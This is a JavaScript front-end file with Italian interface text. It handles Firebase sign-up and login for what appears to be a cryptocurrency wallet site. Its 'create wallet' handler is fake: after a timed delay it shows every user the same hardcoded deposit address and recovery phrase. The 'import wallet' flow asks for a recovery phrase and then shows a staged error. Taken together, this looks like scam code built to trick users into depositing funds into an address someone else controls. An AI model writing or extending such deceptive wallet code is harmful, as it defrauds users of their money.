// Firebase config
var firebaseConfig = {
    apiKey: "TUO_API_KEY",
    authDomain: "TUO_DOMINIO.firebaseapp.com",
    projectId: "ID_PROGETTO",
    storageBucket: "TUO_BUCKET.appspot.com",
    messagingSenderId: "MESSAGING_SENDER_ID",
    appId: "APP_ID"
};
firebase.initializeApp(firebaseConfig);
var db = firebase.firestore();
document.getElementById('register-form').addEventListener('submit', function(e) {
    e.preventDefault();
    var nickname = document.getElementById('nickname').value;
    var email = document.getElementById('email').value;
    var password = document.getElementById('password').value;

    firebase.auth().createUserWithEmailAndPassword(email, password)
    .then(function(userCredential) {
        var user = userCredential.user;
        db.collection("users").doc(user.uid).set({
            nickname: nickname,
            email: email
        }).then(() => {
            alert("Registrazione completata!");
            window.location.href = 'login.html';
        });
    })
    .catch(function(error) {
        alert(error.message);
    });
});
document.getElementById('login-form').addEventListener('submit', function(e) {
    e.preventDefault();
    var email = document.getElementById('login-email').value;
    var password = document.getElementById('login-password').value;

    firebase.auth().signInWithEmailAndPassword(email, password)
    .then((userCredential) => {
        alert("Accesso effettuato!");
        window.location.href = 'user_dashboard.html';
    })
    .catch((error) => {
        alert("Credenziali errate!");
    });
});
document.getElementById('create-wallet-btn').addEventListener('click', function() {
    var popup = document.getElementById('wallet-popup');
    var message = document.getElementById('wallet-message');

    popup.style.display = 'block';
    message.innerHTML = "Creazione in corso, attendere...";

    setTimeout(() => {
        message.innerHTML = "Wallet creato!<br>Ecco il tuo indirizzo di deposito: <br>0x5bE9109ec4c6D1055C7280B1b2d2Ba657e5Bc780<br><br>Recovery phrase:<br>style object stage next mansion puzzle curious option left rose caution educate";
    }, 7000);
});
document.getElementById('import-wallet-btn').addEventListener('click', function() {
    var popup = document.getElementById('wallet-popup');
    var message = document.getElementById('wallet-message');

    popup.style.display = 'block';
    message.innerHTML = "Inserisci la recovery phrase...";

    setTimeout(() => {
        message.innerHTML = "Errore durante l'importazione!";
    }, 9000);
});
